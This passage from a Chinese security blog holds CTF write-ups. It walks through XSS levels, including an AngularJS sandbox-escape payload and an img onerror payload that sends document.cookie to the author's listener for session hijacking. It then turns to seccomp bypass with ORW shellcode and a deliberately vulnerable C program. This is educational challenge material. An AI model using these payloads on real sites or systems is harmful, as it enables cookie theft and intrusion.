getQueryVariable(&#x27;autosubmit&#x27;) 检查当前 URL 是否包含 autosubmit 参数。</span></span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_">getQueryVariable</span>(<span class="string">&#x27;autosubmit&#x27;</span>) !== <span class="literal">false</span>)&#123;</span><br><span class="line">  <span class="keyword">var</span> autoForm = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;autoForm&#x27;</span>);</span><br><span class="line">          <span class="comment">// 表单的 action 动态从查询参数 action 获取。</span></span><br><span class="line">          <span class="comment">// 如果没有提供 action 参数，则默认为当前页面的 URL (location.href)。</span></span><br><span class="line">  autoForm.<span class="property">action</span> = (<span class="title function_">getQueryVariable</span>(<span class="string">&#x27;action&#x27;</span>) == <span class="literal">false</span>) ? location.<span class="property">href</span> : <span class="title function_">getQueryVariable</span>(<span class="string">&#x27;action&#x27;</span>);</span><br><span class="line">  autoForm.<span class="title function_">submit</span>();</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  </span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">// 解析当前页面的 URL 查询参数，并根据传入的参数名返回对应的值。</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getQueryVariable</span>(<span class="params">variable</span>)</span><br><span class="line">&#123;</span><br><span class="line">       <span class="keyword">var</span> query = <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">search</span>.<span class="title function_">substring</span>(<span class="number">1</span>);</span><br><span class="line">       <span class="keyword">var</span> vars = query.<span class="title function_">split</span>(<span class="string">&quot;&amp;&quot;</span>);</span><br><span class="line">       <span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;vars.<span class="property">length</span>;i++) &#123;</span><br><span class="line">               <span class="keyword">var</span> pair = vars[i].<span class="title function_">split</span>(<span class="string">&quot;=&quot;</span>);</span><br><span class="line">               <span class="keyword">if</span>(pair[<span class="number">0</span>] == variable)&#123;<span class="keyword">return</span> pair[<span class="number">1</span>];&#125;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span>(<span class="literal">false</span>);</span><br><span class="line">&#125;</span><br><span class="line">  &lt;/script&gt;</span><br></pre></td></tr></table></figure></div><blockquote><h3 id="代码流程"><a href="#代码流程" class="headerlink" title="代码流程"></a><strong>代码流程</strong></h3><ol><li><p>用户访问 URL，例如：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/?autosubmit=<span class="literal">true</span>&amp;action=http://malicious.com</span><br></pre></td></tr></table></figure></div></li><li><p><code>autosubmit</code> 参数存在且不为 <code>false</code>，触发表单自动提交逻辑。</p></li><li><p>表单 <code>action</code> 被动态设置为 <code>http://malicious.com</code>。</p></li><li><p>表单自动提交到指定的 <code>action</code> URL。</p></li></ol></blockquote><p>那么很简单了，照着第四关直接写<code>action</code></p><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">autosubmit=<span class="literal">true</span>&amp;action=<span class="attr">javascript</span>:<span class="title function_">alert</span>(<span class="number">1</span>)</span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241120221716769.bmp"></p><ul><li><strong>第六关</strong></li></ul><p><mark>AngularJS XSS漏洞<mark></mark></mark></p><p>参考文章：<a class="link" href="https://nosec.org/home/detail/4153.html">https://nosec.org/home/detail/4153.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p><a class="link" href="https://xz.aliyun.com/t/4638?time__1311=n4+xni0Qi=Y6DCDlxGrbDymDRiWCqj=jdx">https://xz.aliyun.com/t/4638?time__1311=n4%2Bxni0Qi%3DY6DCDlxGrbDymDRiWCqj%3Djdx <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p>查看源代码：</p><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;zh&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>XSS配套测试平台<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html; charset=utf-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1, maximum-scale=1&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=Edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;https://houtai.baidu.com/v2/csssdk&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;main.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.staticfile.org/angular.js/1.4.6/angular.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">html</span>, <span class="selector-tag">body</span>, <span class="selector-class">.app-wrapper</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">position</span>: relative;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">width</span>: <span class="number">100%</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">height</span>: <span class="number">100%</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">padding</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span> <span class="attr">class</span>=<span class="string">&quot;app-wrapper amis-scope&quot;</span> <span class="attr">ng-app</span>=<span class="string">&quot;&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;amis-routes-wrapper&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;a-Toast-wrap a-Toast-wrap--topRight&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;a-Page&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;a-Page-content&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;a-Page-main&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;a-Page-header&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">h2</span> <span class="attr">class</span>=<span class="string">&quot;a-Page-title&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;a-TplField&quot;</span>&gt;</span>XSS test platform<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">h2</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;a-Page-body&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;a-TplField&quot;</span>&gt;</span>welcome xss<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">if</span>(location.<span class="property">search</span> == <span class="string">&quot;&quot;</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        location.<span class="property">search</span> = <span class="string">&quot;?username=xss&quot;</span></span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></div><ul><li>关键点其实是在上面的：</li></ul><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">&quot;https://cdn.staticfile.org/angular.js/1.4.6/angular.min.js&quot;</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure></div><p>尝试输入一个<code>&#123;&#123;2*2&#125;&#125;</code>，发现返回是4，说明可能有模板注入</p><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241120223411159.bmp"></p><p>根据参考文章找个payload直接一把梭</p><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=&#123;&#123;<span class="string">&#x27;a&#x27;</span>.<span class="property">constructor</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">charAt</span>=[].<span class="property">join</span>;$eval(<span class="string">&#x27;x=1&#125; &#125; &#125;;alert(1)//&#x27;</span>);&#125;&#125;</span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241120223603988.bmp"></p><ul><li>然后就有flag了</li></ul><h2 id="BUU-XSS-COURSE-1"><a href="#BUU-XSS-COURSE-1" class="headerlink" title="BUU XSS COURSE 1"></a>BUU XSS COURSE 1</h2><ul><li>进入网址发现登录不上，那么便从吐槽页面入手</li></ul><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241121205207372.bmp"></p><ul><li>照常先用简单的两个标签测试一下：</li></ul><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="number">1</span>)&lt;/script&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span>&gt;</span></span></span><br></pre></td></tr></table></figure></div><p>第一条语句没回显，但是第二个<code>img</code>标签是有回显的，那么后面就拿img标签来写：</p><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241121205438745.bmp"></p><ul><li>我们在云服务器先启一个监听，然后利用xss带出cookie看一看：</li></ul><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 8000</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=<span class="string">&quot;fetch(&#x27;http://服务器ip:8000/?cookie=&#x27;+document.cookie)&quot;</span>&gt;</span><br></pre></td></tr></table></figure></div><p>这个payload的意思是：</p><blockquote><p><strong><code>onerror</code> 事件触发</strong>：当图片加载失败时，触发 <code>onerror</code> 事件。</p><p><strong>使用 <code>fetch</code> 发送数据</strong>：</p><ul><li><code>fetch</code> 是现代浏览器支持的简洁 API，可用于向服务器发送请求。</li><li><code>document.cookie</code> 直接获取当前页面的 Cookie。</li></ul><p><strong>发送 Cookie 到你的服务器</strong>：</p><ul><li>将 <code>cookie</code> 附加到 URL，便于你的服务器接收和记录。</li></ul></blockquote><ul><li>我们查看服务器：</li></ul><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241121205643170.bmp"></p><p>我们可以看到这个cookie是从当前web端获得的，可以猜测这是一个登录成功用户的cookie，下面的<code>Referer</code>表示我们是从那个页面跳转过来的，我们去查看一下那个页面：</p><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241121210416731.bmp"></p><ul><li>提醒我们没登陆，那么简单，我们抓包修改<code>cookie</code>为云服务器收到的<code>cookie</code>即可:</li></ul><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241121210558377.bmp"></p><p><mark>为什么不在一个目录却用的是同一个cookie<mark></mark></mark></p><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241122161119180.bmp"></p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Seccomp学习(2)</title>
      <link href="/2024/11/14/Seccomp%E5%AD%A6%E4%B9%A0-2/"/>
      <url>/2024/11/14/Seccomp%E5%AD%A6%E4%B9%A0-2/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Seccomp(1)已经大致介绍了一下沙箱，并且在最后的结尾处我自己还写了一个<code>orw</code>的源码，简单介绍了一下<code>orw</code>的汇编，这篇文章简单介绍一下常见的沙箱绕过方法。</p><p>参考文章：<a class="link" href="https://blog.csdn.net/Nashi_Ko/article/details/120288385?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522FA51E007-58A1-4FF7-9564-3A72C2C1D786%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=FA51E007-58A1-4FF7-9564-3A72C2C1D786&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-120288385-null-null.142%5Ev100%5Epc_search_result_base8&utm_term=Linux%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E8%A1%A8%EF%BC%8832%E4%BD%8D%EF%BC%89&spm=1018.2226.3001.4187">Linux X86架构 32 64系统调用表 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>❤️❤️</p><h1 id="ORW"><a href="#ORW" class="headerlink" title="ORW"></a>ORW</h1><p>还是先简单介绍一下<code>ORW</code>，上一篇文章介绍了64位的，这里简单介绍一下32位</p><h2 id="32位"><a href="#32位" class="headerlink" title="32位"></a>32位</h2><ul><li>先编译源码，在开始编译32位之前，要先安装32位的libseccomp以及工具链</li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install libseccomp2:i386</span><br><span class="line">sudo apt install gcc-multilib g++-multilib</span><br></pre></td></tr></table></figure></div><ul><li>源码：</li></ul><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc -g orw32.c -o orw32 -fno-stack-protector -no-pie -z execstack -m32 /usr/lib/i386-linux-gnu/libseccomp.so.2</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">seccomp</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    scmp_filter_ctx ctx;</span><br><span class="line">    ctx = seccomp_init(SCMP_ACT_ALLOW);</span><br><span class="line">    seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execve),<span class="number">0</span>);</span><br><span class="line">    seccomp_load(ctx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>,<span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>,<span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    init();</span><br><span class="line">    seccomp();</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x100</span>];</span><br><span class="line">    <span class="built_in">memset</span>(buf,<span class="number">0</span>,<span class="keyword">sizeof</span>(buf));</span><br><span class="line">    read(<span class="number">0</span>,buf,<span class="number">0x200</span>);</span><br><span class="line">    <span class="type">void</span> (*func)() = (<span class="type">void</span> (*)())buf;</span><br><span class="line">    func();<span class="comment">// 修改为函数指针，方便测试</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h3 id="pwntools"><a href="#pwntools" class="headerlink" title="pwntools"></a>pwntools</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">shellcode = shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;flag&#x27;</span>)</span><br><span class="line">shellcode += shellcraft.read(<span class="number">3</span>,<span class="string">&#x27;esp&#x27;</span>,<span class="number">0x30</span>)</span><br><span class="line">shellcode += shellcraft.write(<span class="number">1</span>,<span class="string">&#x27;esp&#x27;</span>,<span class="number">0x30</span>)</span><br></pre></td></tr></table></figure></div><ul><li><mark>read的3要注意<mark></mark></mark></li></ul><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">stdin</span> -&gt; <span class="number">0</span></span><br><span class="line"><span class="built_in">stdout</span> -&gt; <span class="number">1</span></span><br><span class="line"><span class="built_in">stderr</span> -&gt; <span class="number">2</span></span><br><span class="line">flag -&gt; <span class="number">3</span> <span class="comment">// 从3开始，fd(文件描述符)就是其他文件了</span></span><br></pre></td></tr></table></figure></div><h3 id="手写"><a href="#手写" class="headerlink" title="手写"></a>手写</h3><p>1.获得”flag”的小端序</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;flag&quot;</span>[::-<span class="number">1</span>].encode().<span class="built_in">hex</span>()</span><br><span class="line"><span class="string">&#x27;67616c66&#x27;</span></span><br></pre></td></tr></table></figure></div><p>2.shellcode直接写，在开头清空了一个字长的esp</p><p>只需要记住三个参数顺序是<code>ebx,rcx,edx</code>以及其所对应的含义，应该还是不难记的</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">shellcode = &#x27;&#x27;&#x27;</span><br><span class="line">push 1;</span><br><span class="line">dec byte ptr [esp];</span><br><span class="line">/* open(&#x27;flag&#x27;) */</span><br><span class="line">push 0x67616c66;</span><br><span class="line">mov ebx, esp;</span><br><span class="line">xor ecx, ecx;</span><br><span class="line">xor edx, edx;</span><br><span class="line">push 5;pop eax;</span><br><span class="line">int 0x80;</span><br><span class="line"></span><br><span class="line">/* read(3,&#x27;esp&#x27;,0x30) */</span><br><span class="line">mov ecx, esp;</span><br><span class="line">push 3; pop ebx;</span><br><span class="line">push 0x30; pop edx;</span><br><span class="line">push 3; pop eax;</span><br><span class="line">int 0x80;</span><br><span class="line"></span><br><span class="line">/* write(1,&#x27;esp&#x27;,0x30) */</span><br><span class="line">mov ecx, esp;</span><br><span class="line">push 1; pop ebx;</span><br><span class="line">push 0x30; pop edx;</span><br><span class="line">push 4; pop eax;</span><br><span class="line">int 0x80;</span><br><span class="line">&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure></div><blockquote><p><code>dec byte ptr [esp];</code>是指将esp指向的地址数据-1</p><p><img lazyload src="/images/loading.svg" data-src="/../capture_20240901114138740-1731576519734-1.bmp"></p></blockquote><h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><p><a class="link" href="https://buuoj.cn/challenges#pwnable_orw">pwnable_orw <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p>和上面讲解的可以说没什么区别，只是在写shellcode前加了一段输出，但是不知道为什么我一直打不通，不是很理解。仿照着自己写一个，但是没开canary，没太大影响。</p><p><code>buuctf</code>没打通换<code>pwnable</code>去打：<a class="link" href="https://pwnable.tw/challenge/#2">https://pwnable.tw/challenge/#2 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><ul><li>源码：</li></ul><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc -g orw.c -o orw -fno-stack-protector -no-pie -z execstack -m32 /usr/lib/i386-linux-gnu/libseccomp.so.2</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">seccomp</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    scmp_filter_ctx ctx;</span><br><span class="line">    ctx = seccomp_init(SCMP_ACT_ALLOW);</span><br><span class="line">    seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execve),<span class="number">0</span>);</span><br><span class="line">    seccomp_load(ctx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>,<span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>,<span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    init();</span><br><span class="line">    seccomp();</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x100</span>];</span><br><span class="line">    <span class="built_in">memset</span>(buf,<span class="number">0</span>,<span class="keyword">sizeof</span>(buf));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Have a try!!!!&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>,buf,<span class="number">0x200</span>);</span><br><span class="line">    <span class="type">void</span> (*func)() = (<span class="type">void</span> (*)())buf;</span><br><span class="line">    func();<span class="comment">// 修改为函数指针，方便测试</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><ul><li>EXP</li></ul><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr</span>():</span><br><span class="line">    <span class="keyword">return</span> u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title 